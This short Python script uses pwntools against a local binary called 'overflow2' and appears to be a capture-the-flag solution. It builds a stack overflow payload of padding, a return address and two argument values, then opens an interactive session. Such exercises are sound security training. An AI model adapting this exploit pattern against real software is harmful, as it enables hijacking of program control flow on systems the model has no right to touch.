from pwn import *

p = process("./overflow2")

x = p.recv()

flag = 0x80485e6
arg1 = 0xDEADBEEF
arg2 = 0xC0DED00D
payload = ""

payload += "A"*188
payload += p32(flag)
payload += "AAAA"
payload += p32(arg1)
payload += p32(arg2)


p.sendline(payload)
p.interactive()


